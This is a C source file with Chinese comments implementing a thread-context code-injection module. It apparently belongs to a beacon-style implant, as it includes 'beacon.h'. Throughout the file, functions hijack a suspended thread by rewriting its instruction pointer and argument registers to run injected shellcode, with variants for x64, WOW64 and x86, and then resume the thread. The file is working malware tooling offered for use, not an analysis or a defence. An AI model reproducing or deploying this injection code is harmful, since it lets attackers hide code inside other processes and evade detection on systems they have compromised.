/*
 * 线程上下文注入模块 (Thread Context Injection Module)
 * 
 * 此模块实现了通过修改线程上下文来进行代码注入的技术。主要功能包括：
 * 
 * 核心技术：
 * 1. SetThreadContext注入 - 修改挂起线程的寄存器状态，使其执行我们的代码
 * 2. ResumeThread恢复 - 恢复线程执行以触发注入的代码
 * 3. 跨架构支持 - 支持x86和x64架构的线程上下文操作
 * 
 * 工作原理：
 * - 目标线程必须处于挂起状态 (CREATE_SUSPENDED)
 * - 获取线程当前上下文（寄存器状态）
 * - 修改指令指针寄存器指向我们的代码
 * - 通过参数寄存器传递参数（架构相关）
 * - 恢复线程执行，触发我们的代码运行
 * 
 * 架构兼容性：
 * - x64环境：支持x64线程和x86线程（通过WOW64）
 * - x86环境：仅支持x86线程
 * 
 * 限制：
 * - 需要目标线程处于挂起状态
 * - x86架构下无法传递参数
 * - 跨架构注入存在限制
 */

#include <stdlib.h>
#include <stdio.h>
#include <windows.h>
#include <Tlhelp32.h>
#include "beacon.h"
#include "inject.h"

// 改进：添加错误码定义
#define CONTEXT_INJECT_SUCCESS          0x00
#define CONTEXT_INJECT_ERROR_PARAMS     0x01
#define CONTEXT_INJECT_ERROR_CONTEXT    0x02
#define CONTEXT_INJECT_ERROR_RESUME     0x03

// 改进：添加调试宏
#ifdef _DEBUG
#define DEBUG_LOG(msg, ...) printf("[DEBUG] " msg "\n", __VA_ARGS__)
#else
#define DEBUG_LOG(msg, ...)
#endif

/*
 * x64架构的线程上下文注入实现
 * 
 * 在x64架构下，函数调用约定使用RCX和RDX寄存器传递前两个参数
 * 这使得我们可以同时传递函数地址和参数
 * 
 * 参数：
 * - hThread: 目标线程句柄（必须处于挂起状态）
 * - lpStartAddress: 要执行的函数地址
 * - lpParameter: 传递给函数的参数
 * 
 * 返回值：TRUE表示成功，FALSE表示失败
 */
#if defined _M_X64
BOOL inject_via_resumethread_x64(HANDLE hThread, LPVOID lpStartAddress, LPVOID lpParameter) {
    CONTEXT ctx;
    DWORD lastError;

    // 改进：输入验证
    if (hThread == NULL || hThread == INVALID_HANDLE_VALUE) {
        DEBUG_LOG("Invalid thread handle provided");
        return FALSE;
    }

    if (lpStartAddress == NULL) {
        DEBUG_LOG("Invalid start address provided");
        return FALSE;
    }

    // 改进：初始化上下文结构
    memset(&ctx, 0, sizeof(ctx));

    /* 尝试获取线程的当前上下文信息 */
    ctx.ContextFlags = CONTEXT_CONTROL | CONTEXT_INTEGER;  // 改进：添加CONTEXT_CONTROL
    if (!GetThreadContext(hThread, &ctx)) {
        lastError = GetLastError();
        DEBUG_LOG("GetThreadContext failed with error: %d", lastError);
        
        // 改进：尝试不同的上下文标志
        ctx.ContextFlags = CONTEXT_INTEGER;
        if (!GetThreadContext(hThread, &ctx)) {
            return FALSE;
        }
    }

    // 改进：保存原始上下文用于调试
    DWORD64 originalRip = ctx.Rip;
    DWORD64 originalRcx = ctx.Rcx;
    DWORD64 originalRdx = ctx.Rdx;

    /* 
     * 更新寄存器：
     * - RIP (指令指针): 指向我们要执行的代码
     * - RCX: 第一个参数寄存器，传递函数地址
     * - RDX: 第二个参数寄存器，传递参数
     */
    ctx.Rip = (DWORD64)lpStartAddress;  // 改进：直接设置RIP而不是RCX
    ctx.Rcx = (DWORD64)lpStartAddress;  // 兼容性：某些shellcode可能期望这个值
    ctx.Rdx = (DWORD64)lpParameter;

    // 改进：设置栈指针对齐
    if (ctx.Rsp & 0xF) {
        ctx.Rsp &= ~0xF;  // 16字节对齐
        ctx.Rsp -= 8;     // 为返回地址预留空间
    }

    if (!SetThreadContext(hThread, &ctx)) {
        lastError = GetLastError();
        DEBUG_LOG("SetThreadContext failed with error: %d", lastError);
        return FALSE;
    }

    DEBUG_LOG("Context modified: RIP=%p, RCX=%p, RDX=%p (was RIP=%p, RCX=%p, RDX=%p)", 
        (void*)ctx.Rip, (void*)ctx.Rcx, (void*)ctx.Rdx,
        (void*)originalRip, (void*)originalRcx, (void*)originalRdx);

    /* 恢复线程执行 */
    DWORD suspendCount = ResumeThread(hThread);
    if (suspendCount == -1) {
        lastError = GetLastError();
        DEBUG_LOG("ResumeThread failed with error: %d", lastError);
        return FALSE;
    }

    DEBUG_LOG("Thread resumed successfully, previous suspend count: %d", suspendCount);
    return TRUE;
}

/*
 * x86架构线程的上下文注入（在x64环境下通过WOW64）
 * 
 * WOW64环境下的x86线程需要使用特殊的WOW64 API
 * 由于x86调用约定的限制，无法直接传递参数
 * 
 * 参数：
 * - hThread: 目标x86线程句柄
 * - lpStartAddress: 要执行的函数地址
 * - lpParameter: 参数（必须为NULL，因为无法传递）
 * 
 * 返回值：TRUE表示成功，FALSE表示失败
 */
BOOL inject_via_resumethread_x86(HANDLE hThread, LPVOID lpStartAddress, LPVOID lpParameter) {
    WOW64_CONTEXT ctx;
    DWORD lastError;

    // 改进：输入验证
    if (hThread == NULL || hThread == INVALID_HANDLE_VALUE) {
        DEBUG_LOG("Invalid thread handle provided");
        return FALSE;
    }

    if (lpStartAddress == NULL) {
        DEBUG_LOG("Invalid start address provided");
        return FALSE;
    }

    /* x86架构下我们无法传递参数，因此如果有参数就失败 */
    if (lpParameter != NULL) {
        DEBUG_LOG("Cannot pass parameters in x86 context injection");
        return FALSE;
    }

    // 改进：检查是否支持WOW64操作
    static BOOL wow64Checked = FALSE;
    static BOOL wow64Available = FALSE;
    
    if (!wow64Checked) {
        HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
        if (hKernel32) {
            wow64Available = (GetProcAddress(hKernel32, "Wow64GetThreadContext") != NULL);
        }
        wow64Checked = TRUE;
    }

    if (!wow64Available) {
        DEBUG_LOG("WOW64 APIs not available");
        return FALSE;
    }

    // 改进：初始化WOW64上下文结构
    memset(&ctx, 0, sizeof(ctx));

    /* 尝试获取WOW64线程的当前上下文信息 */
    ctx.ContextFlags = CONTEXT_CONTROL | CONTEXT_INTEGER;
    if (!Wow64GetThreadContext(hThread, &ctx)) {
        lastError = GetLastError();
        DEBUG_LOG("Wow64GetThreadContext failed with error: %d", lastError);
        
        // 改进：fallback到只获取整数寄存器
        ctx.ContextFlags = CONTEXT_INTEGER;
        if (!Wow64GetThreadContext(hThread, &ctx)) {
            return FALSE;
        }
    }

    // 改进：保存原始上下文
    DWORD originalEip = ctx.Eip;
    DWORD originalEax = ctx.Eax;

    /* 
     * 更新x86寄存器：
     * - EIP: 指向我们要执行的代码
     * - EAX: 传统上用于返回值，某些shellcode可能依赖这个值
     */
    ctx.Eip = (DWORD)lpStartAddress;  // 改进：直接设置EIP
    ctx.Eax = (DWORD)lpStartAddress;  // 兼容性

    // 改进：确保栈指针有效且对齐
    if (ctx.Esp == 0 || ctx.Esp & 0x3) {
        ctx.Esp &= ~0x3;  // 4字节对齐
        ctx.Esp -= 4;     // 为返回地址预留空间
    }

    if (!Wow64SetThreadContext(hThread, &ctx)) {
        lastError = GetLastError();
        DEBUG_LOG("Wow64SetThreadContext failed with error: %d", lastError);
        return FALSE;
    }

    DEBUG_LOG("WOW64 context modified: EIP=%p, EAX=%p (was EIP=%p, EAX=%p)", 
        (void*)ctx.Eip, (void*)ctx.Eax, (void*)originalEip, (void*)originalEax);

    /* 恢复线程执行 */
    DWORD suspendCount = ResumeThread(hThread);
    if (suspendCount == -1) {
        lastError = GetLastError();
        DEBUG_LOG("ResumeThread failed with error: %d", lastError);
        return FALSE;
    }

    DEBUG_LOG("WOW64 thread resumed successfully, previous suspend count: %d", suspendCount);
    return TRUE;
}

/*
 * 通用的线程上下文注入接口
 * 
 * 根据注入上下文中的架构信息，选择合适的注入方法
 * 
 * 参数：
 * - injctx: 注入上下文，包含目标架构和线程信息
 * - lpStartAddress: 要执行的函数地址
 * - lpParameter: 传递给函数的参数
 * 
 * 返回值：TRUE表示成功，FALSE表示失败
 */
BOOL inject_via_resumethread(INJECTCONTEXT * injctx, LPVOID lpStartAddress, LPVOID lpParameter) {
    // 改进：输入验证
    if (injctx == NULL) {
        DEBUG_LOG("Invalid injection context provided");
        return FALSE;
    }

    if (injctx->hThread == NULL || injctx->hThread == INVALID_HANDLE_VALUE) {
        DEBUG_LOG("Invalid thread handle in injection context");
        return FALSE;
    }

    if (!injctx->isSuspended) {
        DEBUG_LOG("Thread is not suspended, cannot modify context");
        return FALSE;
    }

    // 改进：记录注入尝试
    DEBUG_LOG("Attempting context injection: target arch=%s, start=%p, param=%p",
        injctx->targetArch == INJECT_ARCH_X86 ? "x86" : "x64",
        lpStartAddress, lpParameter);

    /* 根据目标架构选择合适的注入方法 */
    if (injctx->targetArch == INJECT_ARCH_X86) {
        return inject_via_resumethread_x86(injctx->hThread, lpStartAddress, lpParameter);
    } else {
        return inject_via_resumethread_x64(injctx->hThread, lpStartAddress, lpParameter);
    }
}

/*
 * x86编译环境下的线程上下文注入实现
 * 
 * 在x86环境下，我们只能处理同架构的线程注入
 * 由于调用约定限制，无法传递参数
 */
#elif defined _M_IX86

BOOL inject_via_resumethread(INJECTCONTEXT * injctx, LPVOID lpStartAddress, LPVOID lpParameter) {
    CONTEXT ctx;
    DWORD lastError;

    // 改进：输入验证
    if (injctx == NULL) {
        DEBUG_LOG("Invalid injection context provided");
        return FALSE;
    }

    if (injctx->hThread == NULL || injctx->hThread == INVALID_HANDLE_VALUE) {
        DEBUG_LOG("Invalid thread handle in injection context");
        return FALSE;
    }

    if (lpStartAddress == NULL) {
        DEBUG_LOG("Invalid start address provided");
        return FALSE;
    }

    /* x86环境下无法传递参数 */
    if (lpParameter != NULL) {
        DEBUG_LOG("Cannot pass parameters in x86 context injection");
        return FALSE;
    }

    /* 跨架构注入不支持（x86 -> x64无法更新线程上下文） */
    if (!injctx->sameArch) {
        DEBUG_LOG("Cross-architecture injection not supported from x86");
        return FALSE;
    }

    if (!injctx->isSuspended) {
        DEBUG_LOG("Thread is not suspended, cannot modify context");
        return FALSE;
    }

    // 改进：初始化上下文结构
    memset(&ctx, 0, sizeof(ctx));

    /* 尝试获取线程的当前上下文信息 */
    ctx.ContextFlags = CONTEXT_CONTROL | CONTEXT_INTEGER;
    if (!GetThreadContext(injctx->hThread, &ctx)) {
        lastError = GetLastError();
        DEBUG_LOG("GetThreadContext failed with error: %d", lastError);
        
        // 改进：fallback尝试
        ctx.ContextFlags = CONTEXT_INTEGER;
        if (!GetThreadContext(injctx->hThread, &ctx)) {
            return FALSE;
        }
    }

    // 改进：保存原始上下文
    DWORD originalEip = ctx.Eip;
    DWORD originalEax = ctx.Eax;

    /* 更新EIP指向我们的起始地址，EAX作为兼容性设置 */
    ctx.Eip = (DWORD)lpStartAddress;
    ctx.Eax = (DWORD)lpStartAddress;

    // 改进：确保栈指针有效
    if (ctx.Esp == 0 || ctx.Esp & 0x3) {
        ctx.Esp &= ~0x3;  // 4字节对齐
        ctx.Esp -= 4;     // 为返回地址预留空间
    }

    if (!SetThreadContext(injctx->hThread, &ctx)) {
        lastError = GetLastError();
        DEBUG_LOG("SetThreadContext failed with error: %d", lastError);
        return FALSE;
    }

    DEBUG_LOG("x86 context modified: EIP=%p, EAX=%p (was EIP=%p, EAX=%p)", 
        (void*)ctx.Eip, (void*)ctx.Eax, (void*)originalEip, (void*)originalEax);

    /* 恢复线程执行 */
    DWORD suspendCount = ResumeThread(injctx->hThread);
    if (suspendCount == -1) {
        lastError = GetLastError();
        DEBUG_LOG("ResumeThread failed with error: %d", lastError);
        return FALSE;
    }

    DEBUG_LOG("x86 thread resumed successfully, previous suspend count: %d", suspendCount);
    return TRUE;
}

#endif

// 改进：添加辅助函数

/*
 * 检查线程是否处于可注入状态
 * 
 * 验证线程是否满足上下文注入的条件：
 * - 线程句柄有效
 * - 线程处于挂起状态
 * - 有足够的权限操作线程
 */
BOOL is_thread_injectable(HANDLE hThread) {
    if (hThread == NULL || hThread == INVALID_HANDLE_VALUE) {
        return FALSE;
    }

    // 改进：尝试获取线程信息验证权限
    CONTEXT ctx;
    ctx.ContextFlags = CONTEXT_INTEGER;
    if (!GetThreadContext(hThread, &ctx)) {
        DEBUG_LOG("Cannot access thread context, insufficient privileges");
        return FALSE;
    }

    return TRUE;
}

/*
 * 获取线程上下文注入的能力信息
 * 
 * 返回当前环境下支持的上下文注入能力
 */
DWORD get_context_injection_capabilities() {
    DWORD capabilities = 0;

#if defined _M_X64
    capabilities |= 0x01;  // 支持x64线程
    
    // 检查是否支持WOW64
    HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
    if (hKernel32 && GetProcAddress(hKernel32, "Wow64GetThreadContext")) {
        capabilities |= 0x02;  // 支持WOW64 x86线程
    }
#elif defined _M_IX86
    capabilities |= 0x04;  // 仅支持x86线程
#endif

    return capabilities;
}